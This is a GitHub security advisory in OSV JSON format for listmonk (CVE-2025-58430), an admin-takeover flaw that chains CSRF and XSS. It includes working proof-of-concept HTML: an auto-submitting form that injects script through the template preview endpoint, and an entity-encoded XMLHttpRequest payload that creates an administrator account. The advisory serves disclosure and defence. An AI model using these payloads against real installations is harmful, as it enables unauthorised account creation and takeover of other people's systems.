{
  "affected": [
    {
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-rf24-wg77-gq7w/GHSA-rf24-wg77-gq7w.json"
      },
      "package": {
        "ecosystem": "Go",
        "name": "github.com/knadh/listmonk",
        "purl": "pkg:golang/github.com/knadh/listmonk"
      },
      "ranges": [
        {
          "events": [
            {
              "introduced": "0"
            },
            {
              "last_affected": "1.1.0"
            }
          ],
          "type": "SEMVER"
        }
      ]
    }
  ],
  "aliases": [
    "CVE-2025-58430"
  ],
  "database_specific": {
    "cwe_ids": [
      "CWE-352",
      "CWE-79",
      "CWE-80"
    ],
    "github_reviewed": true,
    "github_reviewed_at": "2025-09-09T20:42:32Z",
    "nvd_published_at": "2025-09-09T20:15:48Z",
    "severity": "HIGH"
  },
  "details": "### Summary\n\nCross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they\u2019re currently authenticated. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker\u2019s choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.\n\n\n### Details\n\nDuring a security evaluation of the webapp, every http request in addition to the session cookie `session` there included `nonce`. The value is not checked and validated by the backend, removing `nonce` allows the requests to be processed correctly.\n\nThis may seem harmless, but if chained to other vulnerabilities it can become a critical vulnerability.\n\nExample HTTP request without nonce : \n<img width=\"1418\" height=\"772\" alt=\"user_creation_without_nonce_burp_request\" src=\"https://github.com/user-attachments/assets/a5026cdd-d360-4919-ae66-29856c3d3f32\" />\n\n\n\n### PoC\n\nLet's look at a \u201cchain\u201d case of vulnerabilities that include the CSRF and XSS.\n\nAn admin (or any user with permissions) can create templates and preview them (`POST /api/templates/preview` ) making it possible to execute javascript code. For example:\n\n<img width=\"1912\" height=\"935\" alt=\"browser_template_editor_with_alert\" src=\"https://github.com/user-attachments/assets/a928a4bd-1e5f-4fbe-af08-196362e271ad\" />\n\nAnd this request can also be made without `nonce`.\n\n<img width=\"1883\" height=\"707\" alt=\"template_preview_burp_request_without_nonce\" src=\"https://github.com/user-attachments/assets/202c6a39-b62f-48c1-becb-688c3325dc41\" />\n\nThen an attacker can exploit this lack of validation to trigger an XSS in the victim's browser (let's assume the admin).\n\nThis is possible for 2 reasons :\n 1) There is no validation of the `nonce` (as mentioned above)\n 2) The `session` cookie has no samesite flag\n\n<img width=\"1557\" height=\"593\" alt=\"no_same_site_response_cookie_burp\" src=\"https://github.com/user-attachments/assets/c3fab6ac-5068-44cd-850a-bd095c10cb77\" />\n\nAs we can see from the image above, no samesite cookie policy is set during login, so the browser will use the default one.\nSome browsers by default set `Lax` (Chrome), but many others use `None` (Firefox, Edge).\n\nFor example, we can host this html page to prompt the admin to make a post request\n\n```html\n<html>\n  <!-- CSRF PoC  -->\n  <body>\n    <form action=\"https://10.100.132.47/api/templates/preview\" method=\"POST\">\n      <input type=\"hidden\" name=\"template&#95;type\" value=\"campaign\" />\n      <input type=\"hidden\" name=\"body\" value=\"&#123;&#123;&#32;template&#32;&quot;content&quot;&#32;&#46;&#32;&#125;&#125;&#13;&#10;&#13;&#10;&lt;script&gt;alert&#40;&#41;&lt;&#47;script&gt;\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n\n\n```\n\n\n\nThe CSRF+XSS PoC written above has been tested on 3 browsers (using their latest versions)\n- Chrome \u274c\n- Firefox \u2705\n- Edge \u2705\n\nExample in Firefox : \n\n![xss_mozilla_poc](https://github.com/user-attachments/assets/04397e79-0fa1-4c99-b8c2-5b2ff2fbf4fa)\n\nWe can now replace the simple `alert()` with any \u201charmful\u201d request. For example, the creation of a new admin account:\n<img width=\"1226\" height=\"925\" alt=\"browser_template_editor_with_final_payload\" src=\"https://github.com/user-attachments/assets/a5a79c50-45f4-4a9c-80a5-683803349d1a\" />\n\n```html\n    <script>\n      function submitRequest()\n      {\n        var xhr = new XMLHttpRequest();\n        xhr.open(\"POST\", \"https:\\/\\/10.100.132.47\\/api\\/users\", true);\n        xhr.setRequestHeader(\"Content-Type\", \"application\\/json\");\n        xhr.withCredentials = true;\n        var body = \"{\\\"username\\\":\\\"testuser4\\\",\\\"email\\\":\\\"test3@test.com\\\",\\\"name\\\":\\\"testuser4\\\",\\\"password\\\":\\\"Test12345\\\",\\\"passwordLogin\\\":true,\\\"type\\\":\\\"user\\\",\\\"status\\\":\\\"enabled\\\",\\\"listRoleId\\\":\\\"\\\",\\\"userRoleId\\\":1,\\\"password2\\\":\\\"Test12345\\\",\\\"password_login\\\":true,\\\"user_role_id\\\":1,\\\"list_role_id\\\":null}\";\n        var aBody = new Uint8Array(body.length);\n        for (var i = 0; i < aBody.length; i++)\n          aBody[i] = body.charCodeAt(i); \n        xhr.send(new Blob([aBody]));\n      }\n      submitRequest();\n    </script>\n```\n\nThe final poc that exploits CSRF + XSS,  allowing admin account creation:\n\n```html\n\n<html>\n  <!-- CSRF PoC -->\n  <body>\n    <form action=\"https://10.100.132.47/api/templates/preview\" method=\"POST\">\n      <input type=\"hidden\" name=\"template&#95;type\" value=\"campaign\" />\n      <input type=\"hidden\" name=\"body\" value=\"&#123;&#123;&#32;template&#32;&quot;content&quot;&#32;&#46;&#32;&#125;&#125;&#13;&#10;&#13;&#10;&#32;&#32;&#32;&#32;&lt;script&gt;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;function&#32;submitRequest&#40;&#41;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#123;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;var&#32;xhr&#32;&#61;&#32;new&#32;XMLHttpRequest&#40;&#41;&#59;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;xhr&#46;open&#40;&quot;POST&quot;&#44;&#32;&quot;https&#58;&#92;&#47;&#92;&#47;10&#46;100&#46;132&#46;47&#92;&#47;api&#92;&#47;users&quot;&#44;&#32;true&#41;&#59;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;xhr&#46;setRequestHeader&#40;&quot;Content&#45;Type&quot;&#44;&#32;&quot;application&#92;&#47;json&quot;&#41;&#59;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;xhr&#46;withCredentials&#32;&#61;&#32;true&#59;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;var&#32;body&#32;&#61;&#32;&quot;&#123;&#92;&quot;username&#92;&quot;&#58;&#92;&quot;testuser4&#92;&quot;&#44;&#92;&quot;email&#92;&quot;&#58;&#92;&quot;test3&#64;test&#46;com&#92;&quot;&#44;&#92;&quot;name&#92;&quot;&#58;&#92;&quot;testuser4&#92;&quot;&#44;&#92;&quot;password&#92;&quot;&#58;&#92;&quot;Test12345&#92;&quot;&#44;&#92;&quot;passwordLogin&#92;&quot;&#58;true&#44;&#92;&quot;type&#92;&quot;&#58;&#92;&quot;user&#92;&quot;&#44;&#92;&quot;status&#92;&quot;&#58;&#92;&quot;enabled&#92;&quot;&#44;&#92;&quot;listRoleId&#92;&quot;&#58;&#92;&quot;&#92;&quot;&#44;&#92;&quot;userRoleId&#92;&quot;&#58;1&#44;&#92;&quot;password2&#92;&quot;&#58;&#92;&quot;Test12345&#92;&quot;&#44;&#92;&quot;password&#95;login&#92;&quot;&#58;true&#44;&#92;&quot;user&#95;role&#95;id&#92;&quot;&#58;1&#44;&#92;&quot;list&#95;role&#95;id&#92;&quot;&#58;null&#125;&quot;&#59;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;var&#32;aBody&#32;&#61;&#32;new&#32;Uint8Array&#40;body&#46;length&#41;&#59;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;for&#32;&#40;var&#32;i&#32;&#61;&#32;0&#59;&#32;i&#32;&lt;&#32;aBody&#46;length&#59;&#32;i&#43;&#43;&#41;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;aBody&#91;i&#93;&#32;&#61;&#32;body&#46;charCodeAt&#40;i&#41;&#59;&#32;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;xhr&#46;send&#40;new&#32;Blob&#40;&#91;aBody&#93;&#41;&#41;&#59;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;submitRequest&#40;&#41;&#59;&#13;&#10;&#32;&#32;&#32;&#32;&lt;&#47;script&gt;\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n\n\n```\n\n### Impact\nAdmin account creation",
  "id": "GHSA-rf24-wg77-gq7w",
  "modified": "2025-09-10T21:08:05Z",
  "published": "2025-09-09T20:42:32Z",
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/knadh/listmonk/security/advisories/GHSA-rf24-wg77-gq7w"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-58430"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/knadh/listmonk"
    }
  ],
  "schema_version": "1.7.3",
  "severity": [
    {
      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
      "type": "CVSS_V4"
    }
  ],
  "summary": "listmonk: CSRF to XSS Chain can Lead to Admin Account Takeover"
}